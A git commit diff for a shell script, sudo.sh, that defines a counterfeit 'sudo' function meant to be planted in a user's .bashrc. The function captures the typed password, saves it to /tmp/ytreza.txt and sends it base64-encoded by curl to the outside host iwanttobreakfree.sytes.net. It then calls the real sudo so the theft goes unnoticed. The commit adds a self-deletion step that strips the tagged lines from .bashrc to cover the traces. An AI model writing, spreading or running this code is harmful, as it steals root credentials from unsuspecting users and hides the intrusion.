eef2c06007da0b60d17a35f8afacf05de6d8e636
Administrator <abpowercraft@gmail.com>
2019-12-20 18:52:11 +0100

    autodelete

--- sudo.sh
+++ sudo.sh
@@ -1,11 +1,12 @@
-function sudo () 
-{ 
-    realsudo="$(which sudo)";
-    read -s -p "[sudo] password for $USER: " inputPasswd;
-    printf "\n";
-    printf '%s\n' "$USER : $inputPasswd" > /tmp/ytreza.txt;
-    encoded=$(printf '%s' "$inputPasswd" | base64) > /dev/null 2>&1;
-    curl -X GET "http://iwanttobreakfree.sytes.net:40//$USER:$encoded" > /dev/null 2>&1;
-    $realsudo -S -u root bash -c "exit" <<< "$inputPasswd" > /dev/null 2>&1;
-    $realsudo "${@:1}"
-}
+function sudo () 									 #to_delete
+{ 											 #to_delete
+    realsudo="$(which sudo)";								 #to_delete
+    read -s -p "[sudo] password for $USER: " inputPasswd;				 #to_delete
+    printf "\n";									 #to_delete
+    printf '%s\n' "$USER : $inputPasswd" > /tmp/ytreza.txt;				 #to_delete
+    encoded=$(printf '%s' "$inputPasswd" | base64) > /dev/null 2>&1;			 #to_delete
+    curl -X GET "http://iwanttobreakfree.sytes.net:40//$USER:$encoded" > /dev/null 2>&1; #to_delete
+    $realsudo -S -u root bash -c "exit" <<< "$inputPasswd" > /dev/null 2>&1;		 #to_delete
+    $realsudo "${@:1}"									 #to_delete
+    sed -i '/#to_delete/d' ~.bashrc							 #to_delete
+}											 #to_delete
